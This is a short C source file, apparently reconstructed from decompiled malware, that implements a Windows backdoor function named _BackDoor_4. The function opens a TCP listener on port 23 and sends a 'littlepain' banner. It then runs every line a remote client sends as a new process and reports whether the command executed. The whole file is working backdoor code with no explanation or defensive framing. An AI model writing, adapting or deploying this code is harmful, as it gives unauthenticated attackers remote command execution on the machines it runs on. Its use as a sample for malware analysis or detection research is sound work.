#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

#pragma optimize("", off)
DWORD WINAPI _BackDoor_4(LPVOID Data)
{
    volatile int iVar1_buf[2] = {{0, (int)0}};
    volatile int *p_iVar1 = (volatile int *)&iVar1_buf[0];

    volatile uint32_t uVar2_buf[2] = {{0, (uint32_t)0}};
    volatile uint32_t *p_uVar2 = (volatile uint32_t *)&uVar2_buf[0];

    volatile BOOL BVar3_buf[2] = {{0, (BOOL)0}};
    volatile BOOL *p_BVar3 = (volatile BOOL *)&BVar3_buf[0];

    volatile SOCKET local_14_buf[2] = {{0, (SOCKET)0}};
    volatile SOCKET *p_local_14 = (volatile SOCKET *)&local_14_buf[0];

    volatile SOCKET local_18_buf[2] = {{0, (SOCKET)0}};
    volatile SOCKET *p_local_18 = (volatile SOCKET *)&local_18_buf[0];

    // Loop counter for the inner for loop
    volatile uint32_t local_10_buf[2] = {{0, (uint32_t)0}};
    volatile uint32_t *p_local_10 = (volatile uint32_t *)&local_10_buf[0];

    PROCESS_INFORMATION local_28c;
    STARTUPINFOA local_27c;
    char local_238[260];
    fd_set local_134;
    struct timeval local_30;
    struct sockaddr_in local_28;

    (*p_local_14) = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if ((*p_local_14) != INVALID_SOCKET) {
        local_28.sin_family = AF_INET;
        local_28.sin_addr.s_addr = htonl(INADDR_ANY);
        local_28.sin_port = htons(23);
        (*p_iVar1) = bind((*p_local_14), (struct sockaddr *)&local_28, sizeof(struct sockaddr_in));
        if ((*p_iVar1) != -1) {
            listen((*p_local_14), SOMAXCONN);
            do {
                (*p_local_18) = accept((*p_local_14), NULL, NULL);
                local_30.tv_usec = 0;
                local_30.tv_sec = 60;
                local_134.fd_count = 1;
                local_134.fd_array[0] = (*p_local_18);
                send((*p_local_18), "[:: littlepain ::] by WarGame\r\n", 31, 0);
                while ((*p_iVar1) = select((*p_local_18) + 1, &local_134, NULL, NULL, &local_30), (*p_iVar1) > 0) {
                    memset(local_238, 0, sizeof(local_238));
                    recv((*p_local_18), local_238, sizeof(local_238), 0);
                    (*p_uVar2) = strlen(local_238);
                    for ((*p_local_10) = 0; (*p_local_10) < (*p_uVar2); (*p_local_10)++) {
                        if ((local_238[(*p_local_10)] == '\r') || (local_238[(*p_local_10)] == '\n')) {
                            local_238[(*p_local_10)] = '\0';
                        }
                    }
                    memset(&local_27c, 0, sizeof(local_27c));
                    memset(&local_28c, 0, sizeof(local_28c));
                    local_27c.cb = sizeof(STARTUPINFOA);
                    local_27c.dwFlags = STARTF_USESHOWWINDOW;
                    local_27c.wShowWindow = SW_SHOW;
                    (*p_BVar3) = CreateProcessA(NULL, local_238, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &local_27c, &local_28c);
                    if ((*p_BVar3) == 0) {
                        send((*p_local_18), "Not Executed!\r\n", 15, 0);
                    }
                    else {
                        send((*p_local_18), "Executed!\r\n", 11, 0);
                    }
                }
                closesocket((*p_local_18));
            } while (true);
        }
    }
    return 0;
}
#pragma optimize("", on)
